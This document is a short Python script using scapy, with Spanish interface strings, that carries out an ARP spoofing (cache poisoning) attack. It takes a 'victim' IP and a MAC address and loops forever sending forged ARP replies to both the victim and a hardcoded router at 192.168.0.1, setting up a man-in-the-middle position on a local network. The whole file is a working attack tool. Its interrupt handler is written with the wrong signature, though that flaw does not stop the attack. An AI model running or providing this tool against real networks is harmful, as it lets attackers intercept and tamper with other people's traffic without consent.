#!/usr/bin/env python3

import sys
import time
import sys
import signal
import argparse
import scapy.all as scapy
from termcolor import colored

def def_handler():
    print(colored("[*] Saliendo...\n", "red"))
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", required=True, help="IP de la victima")
    parser.add_argument("-m", "--source", dest="mac", required=True, help="Mac")
    
    options = parser.parse_args()
    return options.target, options.mac

def spoof(target_ip, spoof_ip, mac):
    packet = scapy.ARP(op=2, pdst=target_ip, psrc=spoof_ip, hwsrc=mac)
    scapy.send(packet, verbose=False)

def main():
    target, mac = get_arguments()
    router_ip = "192.168.0.1"
    
    while True:
        spoof(target, router_ip, mac)
        spoof(router_ip, target, mac)
        time.sleep(2)
        

if __name__ == "__main__":
    main()
